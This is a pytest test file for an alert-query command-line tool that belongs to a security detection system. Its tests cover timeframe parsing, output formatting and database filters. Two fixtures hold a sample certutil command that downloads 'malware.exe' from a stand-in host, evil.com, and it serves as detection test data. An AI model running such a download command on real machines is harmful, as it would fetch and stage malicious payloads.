"""
Tests for query_alerts.py - Alert query tool
"""
import json
import pytest
import os
import subprocess
import tempfile
from datetime import datetime, timedelta
from pathlib import Path
import sys

# Add project root to path
sys.path.insert(0, str(Path(__file__).parent.parent))

from query_alerts import (
    parse_timeframe,
    truncate_string,
    format_timestamp,
    get_severity_color,
    Colors
)
from core.database import AlertDatabase
from core.engine import Alert
from collectors.base import Event

REPO_ROOT = Path(__file__).parent.parent


def _make_alert(rule_id, severity, score, platform="linux", minute=0):
    """Build a fully populated Alert for database integration tests."""
    event = Event(
        timestamp=datetime(2026, 10, 15, 12, minute, 0),
        platform=platform,
        process_name="bash",
        command_line=f"cmd {rule_id}",
        user="testuser",
        process_id=1234,
    )
    return Alert(
        rule_id=rule_id,
        rule_name=f"Rule {rule_id}",
        severity=severity,
        event=event,
        timestamp=event.timestamp,
        mitre_attack=["T1000"],
        description="test alert",
        response=["test response"],
        score=score,
    )


def _populate_db(tmp_path):
    """Create a database with three alerts across severities/platforms."""
    db_path = tmp_path / "alerts.db"
    db = AlertDatabase(str(db_path))
    db.save_alert(_make_alert("LNX-001", "critical", 95, "linux", minute=1))
    db.save_alert(_make_alert("LNX-005", "high", 70, "linux", minute=2))
    db.save_alert(_make_alert("WIN-001", "high", 105, "windows", minute=3))
    db.close()
    return db_path


def _run_cli(*args):
    """Run query_alerts.py as a subprocess from the repository root."""
    return subprocess.run(
        [sys.executable, str(REPO_ROOT / "query_alerts.py"), *args],
        capture_output=True,
        text=True,
        cwd=str(REPO_ROOT),
        timeout=60,
    )


class TestTimeframeParsing:
    """Tests for timeframe parsing"""

    def test_parse_hours(self):
        """Test parsing hours"""
        result = parse_timeframe('24h')
        expected = datetime.now() - timedelta(hours=24)

        # Allow 1 second tolerance for test execution time
        assert abs((result - expected).total_seconds()) < 1

    def test_parse_days(self):
        """Test parsing days"""
        result = parse_timeframe('7d')
        expected = datetime.now() - timedelta(days=7)

        assert abs((result - expected).total_seconds()) < 1

    def test_parse_weeks(self):
        """Test parsing weeks"""
        result = parse_timeframe('4w')
        expected = datetime.now() - timedelta(weeks=4)

        assert abs((result - expected).total_seconds()) < 1

    def test_parse_months(self):
        """Test parsing months (approximate as 30 days)"""
        result = parse_timeframe('3m')
        expected = datetime.now() - timedelta(days=90)

        assert abs((result - expected).total_seconds()) < 1

    def test_parse_case_insensitive(self):
        """Test that parsing is case insensitive"""
        result1 = parse_timeframe('24H')
        result2 = parse_timeframe('24h')

        assert abs((result1 - result2).total_seconds()) < 1

    def test_invalid_format_no_number(self):
        """Test invalid format without number"""
        with pytest.raises(ValueError) as exc_info:
            parse_timeframe('h')

        assert "Invalid timeframe format" in str(exc_info.value)

    def test_invalid_format_no_unit(self):
        """Test invalid format without unit"""
        with pytest.raises(ValueError) as exc_info:
            parse_timeframe('24')

        assert "Invalid timeframe format" in str(exc_info.value)

    def test_invalid_unit(self):
        """Test invalid time unit"""
        with pytest.raises(ValueError) as exc_info:
            parse_timeframe('24x')

        assert "Invalid timeframe format" in str(exc_info.value)

    def test_various_valid_formats(self):
        """Test various valid timeframe formats"""
        valid_formats = ['1h', '12h', '24h', '1d', '7d', '30d', '1w', '4w', '1m', '6m']

        for fmt in valid_formats:
            result = parse_timeframe(fmt)
            assert isinstance(result, datetime)
            assert result < datetime.now()


class TestStringFormatting:
    """Tests for string formatting functions"""

    def test_truncate_short_string(self):
        """Test truncating string shorter than max length"""
        result = truncate_string("short", 20)
        assert result == "short"

    def test_truncate_exact_length(self):
        """Test truncating string at exact max length"""
        result = truncate_string("exact", 5)
        assert result == "exact"

    def test_truncate_long_string(self):
        """Test truncating string longer than max length"""
        long_string = "This is a very long command line that needs to be truncated"
        result = truncate_string(long_string, 20)

        assert len(result) == 20
        assert result.endswith("...")
        assert result == "This is a very lo..."

    def test_format_valid_timestamp(self):
        """Test formatting valid ISO timestamp"""
        timestamp = "2025-01-15T14:30:00.123456"
        result = format_timestamp(timestamp)

        assert result == "2025-01-15 14:30:00"

    def test_format_invalid_timestamp(self):
        """Test formatting invalid timestamp returns original"""
        invalid = "not a timestamp"
        result = format_timestamp(invalid)

        assert result == invalid


class TestSeverityColors:
    """Tests for severity color mapping"""

    def test_critical_color(self):
        """Test critical severity color"""
        color = get_severity_color('critical')
        assert color == Colors.CRITICAL

    def test_high_color(self):
        """Test high severity color"""
        color = get_severity_color('high')
        assert color == Colors.HIGH

    def test_medium_color(self):
        """Test medium severity color"""
        color = get_severity_color('medium')
        assert color == Colors.MEDIUM

    def test_low_color(self):
        """Test low severity color"""
        color = get_severity_color('low')
        assert color == Colors.LOW

    def test_unknown_severity(self):
        """Test unknown severity returns reset color"""
        color = get_severity_color('unknown')
        assert color == Colors.RESET

    def test_case_insensitive(self):
        """Test severity color is case insensitive"""
        assert get_severity_color('CRITICAL') == Colors.CRITICAL
        assert get_severity_color('Critical') == Colors.CRITICAL
        assert get_severity_color('critical') == Colors.CRITICAL


class TestDatabaseQuerying:
    """Tests for database querying functionality"""

    def test_get_alerts_filter_semantics(self, tmp_path):
        """
        Filters intersect and apply before the limit (E15).

        These were previously skipped; the CLI crash root cause was that
        AlertDatabase.get_alerts did not accept severity/platform/min_score
        filters at all.
        """
        db_path = _populate_db(tmp_path)
        db = AlertDatabase(str(db_path))
        try:
            assert len(db.get_alerts()) == 3

            critical = db.get_alerts(severity="critical")
            assert [a["rule_id"] for a in critical] == ["LNX-001"]

            linux = db.get_alerts(platform="linux")
            assert {a["rule_id"] for a in linux} == {"LNX-001", "LNX-005"}

            high_score = db.get_alerts(min_score=100)
            assert [a["rule_id"] for a in high_score] == ["WIN-001"]

            combined = db.get_alerts(
                severity="high", platform="linux", min_score=50
            )
            assert [a["rule_id"] for a in combined] == ["LNX-005"]

            empty = db.get_alerts(min_score=200)
            assert empty == []

            assert len(db.get_alerts(limit=1)) == 1

            recent = db.get_alerts(
                start_time=datetime(2026, 10, 15, 12, 2, 0)
            )
            assert [a["rule_id"] for a in recent] == ["WIN-001", "LNX-005"]
        finally:
            db.close()


class TestOutputFormats:
    """Tests for different output formats"""

    def test_table_output_empty(self, capsys):
        """Test table output with no alerts"""
        from query_alerts import format_table_output

        format_table_output([])
        captured = capsys.readouterr()

        assert "No alerts found" in captured.out

    def test_table_output_with_alerts(self, capsys):
        """Test table output with alerts"""
        from query_alerts import format_table_output

        alerts = [
            {
                'id': 1,
                'timestamp': '2025-01-15T14:30:00',
                'severity': 'high',
                'score': 115,
                'rule_id': 'WIN-001',
                'platform': 'windows',
                'process_name': 'certutil.exe',
                'rule_name': 'Certutil Download',
                'command_line': 'certutil.exe -urlcache http://evil.com/malware.exe',
                'mitre_attack': 'T1105'
            }
        ]

        format_table_output(alerts)
        captured = capsys.readouterr()

        assert 'WIN-001' in captured.out
        assert 'windows' in captured.out
        assert 'certutil.exe' in captured.out

    def test_json_output(self, capsys):
        """Test JSON output format"""
        from query_alerts import format_json_output
        import json

        alerts = [
            {
                'id': 1,
                'severity': 'high',
                'score': 115
            }
        ]

        format_json_output(alerts)
        captured = capsys.readouterr()

        # Should be valid JSON
        parsed = json.loads(captured.out)
        assert len(parsed) == 1
        assert parsed[0]['severity'] == 'high'

    def test_csv_output(self, capsys):
        """Test CSV output format"""
        from query_alerts import format_csv_output

        alerts = [
            {
                'id': 1,
                'timestamp': '2025-01-15T14:30:00',
                'severity': 'high',
                'score': 115,
                'rule_id': 'WIN-001',
                'rule_name': 'Certutil',
                'platform': 'windows',
                'process_name': 'certutil.exe',
                'user': 'admin',
                'command_line': 'certutil.exe -urlcache http://evil.com/malware.exe',
                'mitre_attack': 'T1105',
                'description': 'Test'
            }
        ]

        format_csv_output(alerts)
        captured = capsys.readouterr()

        # Should have header and data
        lines = captured.out.strip().split('\n')
        assert len(lines) == 2  # Header + 1 data row
        assert 'id,timestamp,severity' in lines[0]
        assert 'WIN-001' in lines[1]

    def test_summary_statistics(self, capsys):
        """Test summary statistics display"""
        from query_alerts import display_summary

        alerts = [
            {'id': 1, 'severity': 'critical', 'score': 140, 'platform': 'windows',
             'rule_id': 'WIN-001', 'rule_name': 'Test1'},
            {'id': 2, 'severity': 'high', 'score': 115, 'platform': 'linux',
             'rule_id': 'LNX-002', 'rule_name': 'Test2'},
            {'id': 3, 'severity': 'high', 'score': 110, 'platform': 'windows',
             'rule_id': 'WIN-002', 'rule_name': 'Test3'},
        ]

        display_summary(alerts)
        captured = capsys.readouterr()

        # Check for content (color codes may be present)
        assert 'SUMMARY STATISTICS' in captured.out
        assert '3' in captured.out  # Total alerts count
        assert 'Critical' in captured.out
        assert 'High' in captured.out
        assert 'windows' in captured.out.lower() or 'Windows' in captured.out
        assert 'linux' in captured.out.lower() or 'Linux' in captured.out
        assert 'Average' in captured.out  # Score statistics


class TestCliSubprocess:
    """End-to-end CLI runs: filters work, failures stay clean (E15)."""

    def test_severity_filter_no_longer_crashes(self, tmp_path):
        db_path = _populate_db(tmp_path)
        result = _run_cli("--database", str(db_path), "--severity", "critical")
        assert result.returncode == 0
        assert "Traceback" not in result.stderr
        assert "LNX-001" in result.stdout
        assert "LNX-005" not in result.stdout
        assert "WIN-001" not in result.stdout

    def test_min_score_filter(self, tmp_path):
        db_path = _populate_db(tmp_path)
        result = _run_cli("--database", str(db_path), "--min-score", "100")
        assert result.returncode == 0
        assert "WIN-001" in result.stdout
        assert "LNX-001" not in result.stdout

    def test_platform_filter(self, tmp_path):
        db_path = _populate_db(tmp_path)
        result = _run_cli("--database", str(db_path), "--platform", "linux")
        assert result.returncode == 0
        assert "LNX-001" in result.stdout
        assert "WIN-001" not in result.stdout

    def test_combined_filters_intersect(self, tmp_path):
        db_path = _populate_db(tmp_path)
        result = _run_cli(
            "--database", str(db_path),
            "--severity", "high",
            "--platform", "linux",
            "--min-score", "50",
        )
        assert result.returncode == 0
        assert "LNX-005" in result.stdout
        assert "WIN-001" not in result.stdout
        assert "LNX-001" not in result.stdout

    def test_timestamps_render_as_dates(self, tmp_path):
        db_path = _populate_db(tmp_path)
        result = _run_cli("--database", str(db_path))
        assert result.returncode == 0
        assert "2026-10-15 12:01:00" in result.stdout
        # The literal strftime artifact from the old datetime bug.
        assert "<20" not in result.stdout

    def test_invalid_timeframe_fails_cleanly(self, tmp_path):
        db_path = _populate_db(tmp_path)
        result = _run_cli("--database", str(db_path), "--last", "24x")
        assert result.returncode == 1
        assert "Traceback" not in result.stderr
        assert "Invalid timeframe" in result.stderr

    def test_unreadable_database_fails_cleanly(self, tmp_path):
        missing = tmp_path / "no-such-dir" / "alerts.db"
        result = _run_cli("--database", str(missing))
        assert result.returncode == 1
        assert "Traceback" not in result.stderr
        assert "Error" in result.stderr

    def test_json_output_with_filter(self, tmp_path):
        db_path = _populate_db(tmp_path)
        result = _run_cli(
            "--database", str(db_path), "--severity", "high",
            "--format", "json",
        )
        assert result.returncode == 0
        data = json.loads(result.stdout)
        assert {a["rule_id"] for a in data} == {"LNX-005", "WIN-001"}
